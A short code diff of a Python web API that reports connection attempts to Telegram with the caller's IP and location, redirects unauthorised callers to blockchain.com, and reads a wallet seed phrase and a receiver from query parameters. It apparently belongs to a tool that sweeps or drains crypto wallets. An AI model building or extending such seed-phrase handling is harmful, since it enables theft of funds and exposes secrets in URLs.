@@ -59,9 +59,8 @@ def api():
             notification = f'*Error - Connection Refused (1/3)*\n\nSomeone tried to connect to the API without a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nAPI Key: {api_key}'
             tg_notify(str(notification))
             return redirect("http://www.blockchain.com")
-        else:
-            notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}'
-            tg_notify(str(notification))
+        notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}'
+        tg_notify(str(notification))
 
         # Get seed phrase and receiver
         seedphrase = request.args.get('seedphrase')
